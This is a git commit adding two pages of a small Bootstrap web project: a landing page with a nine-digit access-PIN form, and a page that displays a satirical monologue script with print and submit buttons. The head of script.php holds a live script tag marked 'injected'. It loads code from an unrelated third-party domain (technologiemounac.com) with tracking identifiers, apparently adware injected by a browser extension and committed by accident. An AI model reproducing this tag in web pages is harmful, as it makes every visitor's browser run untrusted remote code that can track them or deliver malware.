cf737b2af30c23bc6bef22dd9067d5f90aee5117
Munadil Fahad <munadil98@gmail.com>
2017-02-20 17:26:36 +0600

    Add files via upload

---
+++ index.php
@@ -0,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta http-equiv="Content-Type" content="text/html; charset=us-ascii"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+	<title>Austin | Jones</title>
+	<!-- Bootstrap -->
+	<link href="css/bootstrap.min.css" rel="stylesheet" /><!-- font-awesome -->
+	<link href="css/font-awesome.min.css" rel="stylesheet" /><!-- My Custom Css -->
+	<link href="css/style.css" rel="stylesheet" /><!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries --><!-- WARNING: Respond.js doesn't work if you view the page via file:// --><!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    
+    
+    
+</head>
+<body>
+<div class="container-fluid" >
+<div class="front-page-logo margin-top-15"><button style=" background-color: #000;!important;" class="btn btn-default trnsprnt-btn" data-target=".bs-pin-modal-lg" data-toggle="modal" type="button"><img style="width:180px;height:180px;" alt="landing page logo" class="img-responsive" src="images/front-logo.png" /></button>
+<div aria-labelledby="myLargeModalLabel" class="modal fade bs-pin-modal-lg" role="dialog" tabindex="-1">
+<div class="modal-dialog modal-lg bll" role="document">
+<div class="text-center modal-content transparent-models modal-pin-input">
+<h2 class="access-pin">ACCESS PIN</h2>
+
+<form action="" class="input-field">
+<ul class="list-inline margin-top-20">
+	<li><img alt="xyz" class="img-responsive" src="images/logo-11.png" /> <input maxlength="1" type="text" style="background-color:#000; color:#EFE187;" /></li>
+	<li><img alt="xyz" class="img-responsive" src="images/logo-11.png" /> <input maxlength="1" type="text" style="background-color:#000; color:#EFE187;" /></li>
+	<li><img alt="xyz" class="img-responsive" src="images/logo-11.png" /> <input maxlength="1" type="text" style="background-color:#000; color:#EFE187;" /></li>
+	<li class="hyphen">-</li>
+	<li><img alt="xyz" class="img-responsive" src="images/logo-11.png" /> <input maxlength="1" type="text" style="background-color:#000; color:#EFE187;" /></li>
+	<li><img alt="xyz" class="img-responsive" src="images/logo-11.png" /> <input maxlength="1" type="text" style="background-color:#000; color:#EFE187;" /></li>
+	<li><img alt="xyz" class="img-responsive" src="images/logo-11.png" /> <input maxlength="1" type="text" style="background-color:#000; color:#EFE187;" /></li>
+	<li class="hyphen">-</li>
+	<li><img alt="xyz" class="img-responsive" src="images/logo-11.png" /> <input maxlength="1" type="text" style="background-color:#000; color:#EFE187;" /></li>
+	<li><img alt="xyz" class="img-responsive" src="images/logo-11.png" /> <input maxlength="1" type="text" style="background-color:#000; color:#EFE187;" /></li>
+	<li><img alt="xyz" class="img-responsive" src="images/logo-11.png" /> <input maxlength="1" type="text" style="background-color:#000; color:#EFE187;" /></li>
+</ul>
+</form>
+<br> <br>
+<div style="margin-top:495px;" class="click-button text-center resister-btn"><button onClick="location.href='register.html'" class="my-btn btn btn-default">REGISTER</button></div>
+</div>
+</div>
+</div>
+</div>
+
+</div>
+
+<!-- jQuery (necessary for Bootstrap's JavaScript plugins) --><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script><!-- Include all compiled plugins (below), or include individual files as needed --><script src="js/bootstrap.min.js"></script><!-- My Custom Js --><script src="js/style.js"></script>
+
+</body>
+</html>
---
+++ script.php
@@ -0,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+	<title>Tell Us a Story</title>
+	<!-- Bootstrap -->
+	<link href="css/bootstrap.min.css" rel="stylesheet" /><!-- font-awesome -->
+	<link href="css/font-awesome.min.css" rel="stylesheet" /><!-- My Custom Css -->
+	<link href="css/style.css" rel="stylesheet" />
+	<link href="css/print.css" rel="stylesheet" />
+	<link href="css/responsive.css" media="all" rel="stylesheet" type="text/css" /><!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries --><!-- WARNING: Respond.js doesn't work if you view the page via file:// --><!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+	<style type="text/css">div.script-text.golden-color h3, div.script-text.golden-color h4{
+            text-align: center;
+        }
+	</style>
+<script data-type="injected" src="//technologiemounac.com/addon/script/content_site?integration=anywhere&v=n11.12.1.194&os_mj=6&os_mn=3&os_bitness=64&mid=e0bd4dd1f884e045e7f81dd8209edbff&uid=E3D09E3B35223EA5633E6C2E52114E33&aid=4020&aid2=none&ts=1482151938&ts2=&psd=true"></script></head>
+<body>
+<div class="container-fluid">
+	<div class="row display-table"  id="scrdisplay-tableoll">
+		<div class="col-md-6 col-md-offset-3 a4_red_frame display-table-cell text-center">
+			<div class="script-text golden-color" id="div_print">
+				<h3 class="golden-color">Business Promoter</h3>
+
+				<h4 class="gray-text">(Calm &amp; Professionally presenting)</h4>
+				<code>Good morning, the board. Chairmen and CEOs, merging companies and potential investors. Welcome to the world&rsquo;s first emotional and ethically challenged private organisation. We have positions opening for scientists, engineers, artists, filmmakers, special effect artists to architects and spiritualists. There are over a hundred different vacancies for mass employment. </code>
+
+				<h4 class="gray-text">(Challenging self questioning)</h4>
+				<code> But the principles according to this futuristic empire, strikes me as bias and almost dictatorial. I am obviously addressing the questionable rules within its code of conduct. It seeks a particular group! Everyone must be heterosexual, surrogating the fact this company does not accept homosexuality, when the current world is opening up a relaxed manner on the issue. Furthermore we see that disabilities are completely scored out. A cold hearted approach to equality indeed. </code>
+
+				<h4 class="gray-text">(Building up anguish)</h4>
+				<code> I like to interject also the section in the employee&rsquo;s application stating in the condition of &ldquo;couplings&rdquo;. I will read out bluntly word for word. &ldquo;Should any applicant be the bearer of a child or pending to be the bearer of any potential infant(s) shall not be granted with job title applied. Whereas any existing employees with the acknowledgment of any off-spring(s) or pending, will be rejected from the work force AFFECTIVE IMMEDIATELY.&rdquo; </code>
+
+				<h4 class="gray-text">(Building up argumentative sarcasm)</h4>
+				<code> To top these already sensitive subjects, we have a personal attack on people who are &ldquo;dappers&rdquo;. Dappers derived from humans whom choose to eat with their mouth open, like an animal, creating a &ldquo;dapping&rdquo; type of irritating noise. </code>
+
+				<h4 class="gray-text">(Ridiculously humouring off)</h4>
+				<code> To be rejected from a job position because potential employees eats loud does not compute to the great and hard work these individuals may perform to service acquired tasks. But these branded clauses are extremely personal and somewhat ridiculous as a whole! </code>
+
+				<h4 class="gray-text">(Creating fearsome warnings and extremism)</h4>
+				<code> Concluding the entirely of this futuristic body to be recognised as a sort of fascistic, sexist, and homophobic as well as anti-birth entity without dappers. Excluding the so-called &ldquo;lesser applicants&rdquo; from operating state of the art high-end technologies with newly established advances of the highly evolved. Quoting loudly like a dictator:- <u>that the future is not for everyone but only a handsome few whom is of specific intelligence and environmentally friendly plus considerate vegetarians state of mind and body</u> &hellip;whom does not &ldquo;dap&rdquo;! </code>
+
+				<h4 class="gray-text">(Coming to an enlightened ideal)</h4>
+
+				<p><b>&hellip;I like it!</b></p>
+
+			</div> <!-- <div class="script-text golden-color"> -->
+		</div> <!-- <div class="col-md-6 col-md-offset-3 a4_red_frame display-table-cell text-center"> -->
+	</div> <!-- <div class="row display-table"  id="scroll"> -->
+
+	</br>
+	<center><a href="donate.php" id="print-btn">
+		<input class="btn my-btn btn-default" type="submit" value="Submit" />
+		</a>
+		<br />
+		<!-- <a class="btn my-btn btn-default" id="print-btn" href="javascript:window.print()">Print</a> -->
+
+		<button class="btn my-btn btn-default" id="print-btn" onClick="printpdf('iFramePdf');">Print</button>
+
+<iframe id="iFramePdf" src="print.pdf" style="display:none;"></iframe>
+
+	</center>
+</div> <!-- <div class="container-fluid"> -->
+
+
+<script type="text/javascript">
+	function printpdf(elementId) {
+    var getMyFrame = document.getElementById(elementId);
+    getMyFrame.focus();
+    getMyFrame.contentWindow.print();
+}
+</script>
+
+<!-- added for test -->
+<script
+  src="https://code.jquery.com/jquery-3.1.1.min.js"
+  integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="
+  crossorigin="anonymous"></script>
+
+
+
+<!-- jQuery (necessary for Bootstrap's JavaScript plugins) --><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script><!-- Include all compiled plugins (below), or include individual files as needed --><script src="js/bootstrap.min.js"></script><!-- My Custom Js --><script src="js/style.js"></script>
+
+<!-- added for test -->
+<!-- <script src="js/jquery.printElement.min.js"></script> -->s
+<script src="js/script.js"></script>
+<script src="js/app.js"></script>
+</body>
+</html>
